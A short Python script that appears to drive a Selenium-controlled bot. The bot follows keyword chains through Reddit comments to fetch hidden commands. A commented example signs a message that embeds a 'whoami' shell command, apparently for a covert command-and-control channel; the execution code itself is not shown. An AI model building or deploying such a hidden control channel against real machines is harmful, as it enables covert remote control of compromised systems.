import time
import bot
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium import webdriver


PATH = r'chromedriver.exe'


if __name__ == '__main__':
    # run the Reddit bot
    bootstap = ['wow', 'fairy', 'fox', 'dream'] #["harrypotter","art","water","lilly"]
    demo = bot.Bot(bootstap)
    status, next_keys = demo.start()

    timeToSleep = 0
    while True:
        if status == 1:  # found next keys
            status, next_keys = demo.get_next_command(next_keys[0], next_keys[1], next_keys[2], next_keys[3])

        if status == 2:  # next keys don't exist [end of path]
            time.sleep(10 * 60)
            status, next_keys = demo.get_next_command(next_keys[0], next_keys[1], next_keys[2], next_keys[3])

        if status == 3:  # didn't find a comment with the given keys [path corrupted]
            status, next_keys =  demo.go_back()

        time.sleep(timeToSleep)



#     ######### sign a message - no new lines! like this: #########
#     msg = """I believe in them!
# 😍rp*whoami
# fairy fox dream
# cats diamond snail river"""
#     x = command_and_control.CommandAndControl()
#     sig = x.createSignature(msg)
#     print(sig)